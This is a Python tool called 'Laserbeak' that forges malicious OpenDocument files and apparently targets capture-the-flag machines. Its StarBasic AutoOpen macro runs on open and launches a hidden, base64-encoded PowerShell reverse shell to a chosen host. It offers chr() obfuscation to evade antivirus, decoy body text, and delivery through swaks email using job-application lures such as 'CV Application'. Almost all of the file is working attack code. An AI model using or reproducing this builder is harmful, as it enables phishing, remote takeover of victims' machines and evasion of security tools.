
#!/usr/bin/env python3
"""
Laserbeak - Decepticon Infiltration System
ODT Macro Injector | Phishing Document Generator
Part of the Soundwave Decepticon Recon Suite
"""

import argparse
import base64
import os
import shutil
import subprocess
import sys
import zipfile
from datetime import datetime

# ─── Colors ───────────────────────────────────────────────────────────────────
VIOLET  = '\033[0;35m'
CYAN    = '\033[0;36m'
RED     = '\033[0;31m'
GREEN   = '\033[0;32m'
YELLOW  = '\033[0;33m'
BOLD    = '\033[1m'
NC      = '\033[0m'

def v(msg):   print(f"{VIOLET}{msg}{NC}")
def ok(msg):  print(f"{VIOLET} [+] {msg}{NC}")
def err(msg): print(f"{RED} [!] {msg}{NC}")
def inf(msg): print(f"{VIOLET} [*] {msg}{NC}")
def warn(msg):print(f"{YELLOW} [?] {msg}{NC}")

# ─── Banner ───────────────────────────────────────────────────────────────────
def banner():
    v("")
    v("  _                        _                      _    ")
    v(" | |    __ _ ___  ___ _ __| |__   ___  __ _  ___| | __")
    v(" | |   / _` / __|/ _ \ '__| '_ \ / _ \/ _` |/ __| |/ /")
    v(" | |__| (_| \__ \  __/ |  | |_) |  __/ (_| | (__|   < ")
    v(" |_____\__,_|___/\___|_|  |_.__/ \___|\__,_|\___|_|\_\\")
    v("")
    v("        [ Decepticon Infiltration System ]              ")
    v("        [ ODT Macro Injector — Phishing Forge ]         ")
    v("        [ Soundwave's eyes inside enemy lines ]         ")
    v("")

# ─── ODT Templates ────────────────────────────────────────────────────────────
MACRO_XBA = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" script:name="Module1" script:language="StarBasic">
Sub AutoOpen()
    Shell "{payload}"
End Sub
</script:module>'''

SCRIPT_LC = '''<?xml version="1.0" encoding="UTF-8"?>
<library:library xmlns:library="http://openoffice.org/2000/library" library:name="Standard" library:readonly="false" library:passwordprotected="false">
 <library:element library:name="Module1"/>
</library:library>'''

LIBRARIES_LC = '''<?xml version="1.0" encoding="UTF-8"?>
<library:libraries xmlns:library="http://openoffice.org/2000/library">
 <library:library library:name="Standard" library:link="false"/>
</library:libraries>'''

MANIFEST_XML = '''<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0">
 <manifest:file-entry manifest:media-type="application/vnd.oasis.opendocument.text" manifest:full-path="/"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="content.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="styles.xml"/>
 <manifest:file-entry manifest:media-type="" manifest:full-path="Basic/Standard/Module1.xba"/>
 <manifest:file-entry manifest:media-type="" manifest:full-path="Basic/Standard/script-lc.xml"/>
 <manifest:file-entry manifest:media-type="" manifest:full-path="Basic/script-lc.xml"/>
</manifest:manifest>'''

CONTENT_XML = '''<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
 xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
 office:version="1.2">
<office:body><office:text><text:p>{body}</text:p></office:text></office:body>
</office:document-content>'''

STYLES_XML = '''<?xml version="1.0" encoding="UTF-8"?>
<office:document-styles xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" office:version="1.2"/>'''

MIMETYPE = "application/vnd.oasis.opendocument.text"

# ─── Payload Presets ──────────────────────────────────────────────────────────
PRESETS = {
    "calc":     "cmd /c calc.exe",
    "whoami":   "cmd /c whoami > C:\\Windows\\Temp\\out.txt",
    "ping":     "cmd /c ping -n 1 {lhost}",
}

# ─── Core Functions ───────────────────────────────────────────────────────────
def build_payload(args) -> str:
    """Build the final Shell payload string."""
    if args.preset:
        p = PRESETS.get(args.preset)
        if not p:
            err(f"Unknown preset '{args.preset}'. Available: {', '.join(PRESETS)}")
            sys.exit(1)
        if "{lhost}" in p:
            if not args.lhost:
                err("--lhost required for this preset")
                sys.exit(1)
            p = p.format(lhost=args.lhost)
        return p

    if args.cmd:
        return args.cmd

    if args.ps_payload:
        return f"cmd /c powershell -NoP -NonI -W Hidden -e {args.ps_payload}"

    if args.lhost and args.lport:
        inf(f"Generating PS reverse shell → {args.lhost}:{args.lport}")
        ps = (
            f"$c=New-Object Net.Sockets.TCPClient('{args.lhost}',{args.lport});"
            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r);"
            f"$s.Write($rb,0,$rb.Length);$s.Flush()}};$c.Close()"
        )
        b64 = base64.b64encode(ps.encode("utf-16-le")).decode()
        return f"cmd /c powershell -NoP -NonI -W Hidden -e {b64}"

    err("No payload specified. Use -p, --cmd, --lhost/--lport, or --preset")
    sys.exit(1)


def obfuscate_macro(payload: str) -> str:
    """Split payload into chr() concatenation to evade basic AV signature on macro."""
    inf("Applying macro obfuscation (chr() encoding)...")
    encoded = ' & '.join([f'Chr({ord(c)})' for c in payload])
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" script:name="Module1" script:language="StarBasic">
Sub AutoOpen()
    Dim s As String
    s = {encoded}
    Shell s
End Sub
</script:module>'''


def create_blank_odt(tmp_dir: str, body: str = ""):
    """Write a minimal valid ODT structure into tmp_dir."""
    os.makedirs(f"{tmp_dir}/META-INF", exist_ok=True)
    os.makedirs(f"{tmp_dir}/Basic/Standard", exist_ok=True)

    with open(f"{tmp_dir}/mimetype", "w") as f:
        f.write(MIMETYPE)
    with open(f"{tmp_dir}/META-INF/manifest.xml", "w") as f:
        f.write(MANIFEST_XML)
    with open(f"{tmp_dir}/content.xml", "w") as f:
        f.write(CONTENT_XML.format(body=body))
    with open(f"{tmp_dir}/styles.xml", "w") as f:
        f.write(STYLES_XML)


def inject_macro_files(tmp_dir: str, macro_xba: str):
    """Write macro files into extracted ODT directory."""
    os.makedirs(f"{tmp_dir}/Basic/Standard", exist_ok=True)
    with open(f"{tmp_dir}/Basic/Standard/Module1.xba", "w") as f:
        f.write(macro_xba)
    with open(f"{tmp_dir}/Basic/Standard/script-lc.xml", "w") as f:
        f.write(SCRIPT_LC)
    with open(f"{tmp_dir}/Basic/script-lc.xml", "w") as f:
        f.write(LIBRARIES_LC)

    # Patch manifest
    manifest_path = f"{tmp_dir}/META-INF/manifest.xml"
    if os.path.isfile(manifest_path):
        with open(manifest_path, "r") as f:
            manifest = f.read()
        entries = [
            ('', 'Basic/Standard/Module1.xba'),
            ('', 'Basic/Standard/script-lc.xml'),
            ('', 'Basic/script-lc.xml'),
        ]
        for media, path in entries:
            if path not in manifest:
                manifest = manifest.replace(
                    "</manifest:manifest>",
                    f' <manifest:file-entry manifest:media-type="{media}" manifest:full-path="{path}"/>\n</manifest:manifest>'
                )
        with open(manifest_path, "w") as f:
            f.write(manifest)


def pack_odt(tmp_dir: str, output: str):
    """Repack directory into a valid ODT zip."""
    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as z:
        for root, dirs, files in os.walk(tmp_dir):
            for file in sorted(files):
                fp = os.path.join(root, file)
                arcname = fp.replace(tmp_dir + "/", "")
                if arcname == "mimetype":
                    z.write(fp, arcname, compress_type=zipfile.ZIP_STORED)
                else:
                    z.write(fp, arcname)


def forge(args):
    """Main forge function — build the malicious ODT."""
    tmp_dir = "/tmp/laserbeak_tmp"
    if os.path.exists(tmp_dir):
        shutil.rmtree(tmp_dir)

    # Build payload
    payload = build_payload(args)
    inf(f"Payload  : {payload[:90]}{'...' if len(payload) > 90 else ''}")

    # Build macro XBA
    if args.obfuscate:
        macro_xba = obfuscate_macro(payload)
    else:
        safe_payload = payload.replace('"', '&quot;')
        macro_xba = MACRO_XBA.format(payload=safe_payload)

    # Extract or create base ODT
    if args.input and os.path.isfile(args.input):
        inf(f"Base ODT : {args.input}")
        with zipfile.ZipFile(args.input, "r") as z:
            z.extractall(tmp_dir)
    else:
        inf("Base ODT : generating blank document")
        body = args.body if args.body else ""
        create_blank_odt(tmp_dir, body)

    # Inject macro
    inject_macro_files(tmp_dir, macro_xba)

    # Pack
    pack_odt(tmp_dir, args.output)
    shutil.rmtree(tmp_dir)

    ok(f"Document forged → {args.output}")
    ok(f"Trigger        → Sub AutoOpen() [fires on document open]")
    if args.lhost:
        ok(f"Listener       → penelope -p {args.lport or 4444} / nc -lvnp {args.lport or 4444}")
    v("")
    v("   Laserbeak is airborne. The document is ready.")
    v("   Till all are one.")
    v("")


# ─── Delivery Helper ─────────────────────────────────────────────────────────
def deliver(args):
    """Send the ODT via SMTP using swaks."""
    if not shutil.which("swaks"):
        err("swaks not found. Install: sudo apt install swaks")
        sys.exit(1)

    if not all([args.to, args.from_addr, args.server, args.attach]):
        err("Delivery requires --to, --from, --server, --attach")
        sys.exit(1)

    subject = args.subject or "Application"
    body    = args.mail_body or "Please find the attached document."

    cmd = [
        "swaks",
        "--to",      args.to,
        "--from",    args.from_addr,
        "--server",  args.server,
        "--port",    str(args.smtp_port),
        "--h-Subject", subject,
        "--body",    body,
        "--attach",  f"@{args.attach}",
    ]

    inf(f"Launching Laserbeak → {args.to} via {args.server}:{args.smtp_port}")
    subprocess.run(cmd)
    ok("Message transmitted.")
    v("")
    v("   Laserbeak returns to Soundwave. Mission complete.")
    v("   Till all are one.")
    v("")


# ─── CLI ──────────────────────────────────────────────────────────────────────
def main():
    banner()

    parser = argparse.ArgumentParser(
        prog="laserbeak.py",
        description="Laserbeak — Decepticon ODT Macro Injector",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{VIOLET}── FORGE ──────────────────────────────────────────────────────────────{NC}
  # Built-in PS reverse shell (no external tool needed)
  python3 laserbeak.py forge --lhost 10.10.14.10 --lport 4444 -o evil.odt

  # Penelope/msfvenom base64 payload
  python3 laserbeak.py forge -p JABjAGwA... -o evil.odt

  # Raw command
  python3 laserbeak.py forge --cmd "cmd /c calc.exe" -o evil.odt

  # Inject into existing ODT template
  python3 laserbeak.py forge -i template.odt --lhost 10.10.14.10 --lport 4444 -o evil.odt

  # With macro obfuscation (chr() encoding)
  python3 laserbeak.py forge --lhost 10.10.14.10 --lport 4444 --obfuscate -o evil.odt

  # Preset payload
  python3 laserbeak.py forge --preset calc -o test.odt

{VIOLET}── DELIVER ────────────────────────────────────────────────────────────{NC}
  python3 laserbeak.py deliver --to victim@target.htb --from cv@attacker.htb \\
    --server 10.10.11.X --attach evil.odt --subject "CV Application"

{VIOLET}── FULL CHAIN ─────────────────────────────────────────────────────────{NC}
  python3 laserbeak.py forge --lhost 10.10.14.10 --lport 4444 -o cv.odt && \\
  python3 laserbeak.py deliver --to career@job.local --from applicant@job.local \\
    --server 10.129.X.X --attach cv.odt
"""
    )

    sub = parser.add_subparsers(dest="command")

    # ── forge ──
    forge_p = sub.add_parser("forge", help="Build malicious ODT document")

    forge_p.add_argument("-i", "--input",      help="Base ODT template (blank if omitted)")
    forge_p.add_argument("-o", "--output",     default="malicious.odt", help="Output file (default: malicious.odt)")
    forge_p.add_argument("--body",             help="Decoy text content in the document")
    forge_p.add_argument("--obfuscate",        action="store_true", help="Obfuscate macro via chr() encoding")

    payload_g = forge_p.add_mutually_exclusive_group()
    payload_g.add_argument("-p", "--ps-payload", dest="ps_payload",
                           help="Base64 PS payload → wrapped in: powershell -e <payload>")
    payload_g.add_argument("--cmd",             help="Raw shell command")
    payload_g.add_argument("--preset",          help=f"Preset payload [{', '.join(PRESETS.keys())}]")

    forge_p.add_argument("--lhost",            help="LHOST for built-in PS reverse shell")
    forge_p.add_argument("--lport",            default="4444", help="LPORT (default: 4444)")

    # ── deliver ──
    del_p = sub.add_parser("deliver", help="Send ODT via SMTP (swaks)")
    del_p.add_argument("--to",          required=True,  help="Recipient email")
    del_p.add_argument("--from",        dest="from_addr", required=True, help="Sender email")
    del_p.add_argument("--server",      required=True,  help="SMTP server IP")
    del_p.add_argument("--port",        dest="smtp_port", default=25, type=int, help="SMTP port (default: 25)")
    del_p.add_argument("--attach",      required=True,  help="ODT file to attach")
    del_p.add_argument("--subject",     default="Application", help="Email subject")
    del_p.add_argument("--mail-body",   dest="mail_body", default="Please find the attached document.", help="Email body")

    args = parser.parse_args()

    if args.command == "forge":
        forge(args)
    elif args.command == "deliver":
        deliver(args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
